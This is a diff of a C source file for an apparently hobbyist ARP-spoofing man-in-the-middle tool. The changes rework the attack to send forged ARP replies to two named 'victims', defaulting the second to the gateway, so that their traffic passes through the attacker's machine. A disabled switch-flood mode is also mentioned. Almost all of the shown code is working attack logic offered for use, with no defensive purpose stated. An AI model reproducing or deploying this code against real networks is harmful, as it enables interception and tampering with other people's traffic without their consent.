@@ -17,15 +17,20 @@
 #include "network.h"
 
 
+extern const MAC  broadcast_mac;
+extern const MAC  null_mac;
+extern const IP  broadcast_ip;
+extern const IP  null_ip;
+extern const struct Host null_host;
 /*-----------------------------------------------------------------------------
  *  Prototypes ..
  *-----------------------------------------------------------------------------*/
 void
-mitm ( char * hostA,char * hostB );
+mitm ( struct Host * host_a,struct Host * host_b );
 void
 mitm_loop (void);
 void
-mitm_check (char * hostA,char * hostB );
+mitm_check (struct Host * host_a,struct Host * host_b );
 void sigint(void);
 void usage(void);
 
@@ -42,18 +47,22 @@ char * interface = NULL;
 /*-----------------------------------------------------------------------------
  *  Our OWN mac address & ip address
  *-----------------------------------------------------------------------------*/
-struct ether_addr mac;
-struct in_addr ip;
+MAC  mac;
+IP  ip;
 
 /*-----------------------------------------------------------------------------
  *  The Victim's IP address
  *  & the packets we will send. Needed to free memory at exit.
  *  Ugly i know, but working & fast.
  *-----------------------------------------------------------------------------*/
-struct in_addr victim_a;
-struct in_addr victim_b;
+//struct in_addr ip_a;
+//struct in_addr ip_b;
+//struct ether_addr mac_a;
+//struct ether_addr mac_b;
+/* Needed so we can get to free them at the end */
 Packet * A = NULL;
 Packet * B = NULL;
+
 
 /*-----------------------------------------------------------------------------
  *  At which frequency should we send packets to flood (both mode).
@@ -98,8 +107,10 @@ void usage(void) {
 main ( int argc, char *argv[] )
 {
     char * operation = NULL;
-    char * hostA = NULL;
-    char * hostB = NULL;
+
+    struct Host host_a = { null_ip, null_mac };
+    struct Host host_b = { null_ip, null_mac };
+
     int c = 0;
 
     if (argc < 2) {
@@ -121,15 +132,13 @@ main ( int argc, char *argv[] )
                 interface = optarg;
                 break;
             case 'a':
-                hostA = optarg;
-                if (inet_aton(hostA,&victim_a) == 0) {
+                if (inet_aton(optarg,&host_a.ip) == 0) {
                     fprintf(stderr,"Invalid parsing of A's address");
                     exit(EXIT_FAILURE);
                 }
                 break;
             case 'b':
-                hostB = optarg;
-                if (inet_aton(hostB,&victim_b) == 0) {
+                if (inet_aton(optarg,&host_b.ip) == 0) {
                     fprintf(stderr,"Invalid parsing of B's address");
                     exit(EXIT_FAILURE);
                 }
@@ -171,7 +180,7 @@ main ( int argc, char *argv[] )
         exit(EXIT_FAILURE);
     }
     /* set up pcap */
-    init_pcap(interface,"arp"); 
+    pcap_init(interface,"arp"); 
 
 
     /* Print arguments to stdout */
@@ -186,7 +195,7 @@ main ( int argc, char *argv[] )
 
     /* Call right method */
     if (strncmp(operation,"mitm",4) == 0) {
-        mitm(hostA,hostB);
+        mitm(&host_a,&host_b);
     } else if (strncmp(operation,"flood",5) == 0) {
         //flood();
         printf("No Switch Flood attack implemented yet.\n");
@@ -204,26 +213,23 @@ main ( int argc, char *argv[] )
  * =====================================================================================
  */
     void
-mitm ( char * hostA,char * hostB )
+mitm ( struct Host* host_a,struct Host* host_b )
 {
-    MAC * broadcast = ETHER_ATON(BROADCAST_MAC);
-    MAC * null = ETHER_ATON(NULL_MAC);
+    int opcode = REPLY;
     /* check addresses etc */
-    mitm_check(hostA,hostB);
+    mitm_check(host_a,host_b);
     /* prepare packets for each dest */
-    A = arp_packet(REQUEST);
-    B = arp_packet(REPLY);
+    A = arp_packet(opcode);
+    B = arp_packet(opcode);
     /* Set ethernet frame -> broadcast .. :/ */
-    arp_set_ethernet_frame(A,&mac,broadcast);
-    arp_set_ethernet_frame(B,&mac,broadcast);
+    arp_set_ethernet_frame(A,&mac,&host_a->mac);
+    arp_set_ethernet_frame(B,&mac,&host_b->mac);
     /* Set Hardware Address fields */
-    arp_set_hard_addr(A,&mac,null);
-    arp_set_hard_addr(B,&mac,null);
-    /* Set Protocol Address fields (IP) */
-    /* Same address for both fields according to RFC 5227 
-     * ARP Announcement */
-    arp_set_proto_addr(A,&victim_a,&victim_a);
-    arp_set_proto_addr(B,&victim_b,&victim_b);
+    arp_set_hard_addr(A,&mac,&host_a->mac);
+    arp_set_hard_addr(B,&mac,&host_b->mac);
+    /* Set ip address accordingly /exchange */
+    arp_set_proto_addr(A,&host_b->ip,&host_a->ip);
+    arp_set_proto_addr(B,&host_a->ip,&host_b->ip);
 
     mitm_loop();
 
@@ -250,81 +256,51 @@ mitm_loop (void)
  *         Name:  mitm_check
  *  Description:  Check if the addresses are good, replace if needed, 
  *  get our OWN MAC address etc..
+ *  Also fetch the MAC address of the two hosts
  * =====================================================================================
  */
     void
-mitm_check (char * hostA,char * hostB )
+mitm_check (struct Host * host_a,struct Host * host_b)
 {
     char victimb[INET_ADDRSTRLEN];
+    int no_b = 0;
     /* First check victim's ip */
-    if(hostA == NULL) {
+    if(cmp_host(host_a,&null_host) == 0) {
         fprintf(stderr,"No Victim specified for MitM attack. Abort.\n");
         exit(EXIT_FAILURE);
     }
+    
     /* if no B victim, default on the gateway */
-    if(hostB == NULL) {
+    if(cmp_host(host_b,&null_host) == 0) {
+        no_b = 1;
         /* Get the default gateway */
         if(get_gatewayip(victimb) == -1) {
             fprintf(stderr,"Could not get gateway's ip address. Abort.\n");
             exit(EXIT_FAILURE);
         }   
         /* Transform it in the right struct in_addr */
-        if(inet_aton(victimb,&victim_b) == 0) {
+        if(inet_aton(victimb,&host_b->ip) == 0) {
             fprintf(stderr,"Could not parse correctly the gateway's ip address. Abort.\n");
             exit(EXIT_FAILURE);
         }
     }
+    
     printf("Man In The Middle Attack :");
-    printf("\n\tHost A : %s",inet_ntoa(victim_a));
-    printf("\n\tHost B : %s",inet_ntoa(victim_b));
-    if(hostB == NULL) printf(" (default gateway)");
-
+    printf("\n\tHost A : %s (%s)",inet_ntoa(host_a->ip),ether_ntoa(&host_a->mac));
+    printf("\n\tHost B : %s (%s)",inet_ntoa(host_b->ip),ether_ntoa(&host_b->mac));
+    if(no_b) printf(" | default gateway ");
+    printf("\n");
+        
+    /* Try to get the MAC address of A */
+    if(arp_resolve_mac(host_a) == -1) {
+        fprintf(stderr,"Abort.\n");
+        exit(EXIT_FAILURE);
+    }
+    /* Try to get the MAC address */
+    if(arp_resolve_mac(host_b) == -1) {
+        fprintf(stderr,"Abort.\n");
+        exit(EXIT_FAILURE);
+    }
     return ;
 }		/* -----  end of function mitm_check  ----- */
 
-
-/*-----------------------------------------------------------------------------
- *  old main. Just kept because it shows how to prepare sniffing with pcap
- *  routines.
- *-----------------------------------------------------------------------------*/
-//int main(int argc, char * argv[])
-//{
-//    int i = 0; // counter
-//    int ret;
-//    char * default_filter = "arp";
-//    char * filter;
-//    int pcount = -1; //take all packet by defaults
-//    char * interface;
-//    if(argc < 4) {
-//        fprintf(stderr, "Not enough arguments\n");
-//        usage();
-//        exit(EXIT_FAILURE);
-//    }
-//    // take command line filter
-//    if(argc > 3) {
-//        filter = argv[4];
-//    } else {
-//        filter = default_filter;
-//    }
-//    // take command line packet count limit
-//    if(argc > 4) {
-//        pcount = atoi(argv[4]);
-//    }
-//    interface = argv[1];
-//    if(inet_aton(argv[2],&victimip) == 0) {
-//        fprintf(stderr,"Invalid parsing of the victim ip address\n");
-//        exit(EXIT_FAILURE);
-//    }
-//    if(inet_aton(argv[3],&routerip) == 0) {
-//        fprintf(stderr,"Invalid parsing of the router ip address\n");
-//        exit(EXIT_FAILURE);
-//    }
-//
-//    get_mac_addr(interface,mac);
-//    
-//    printf("Arguments : interface %s (",interface);
-//    print_mac_addr(mac);
-//    printf(", ip router %s\n",inet_ntoa(routerip));
-//
-//    signal(SIGINT,sigint);
-//}
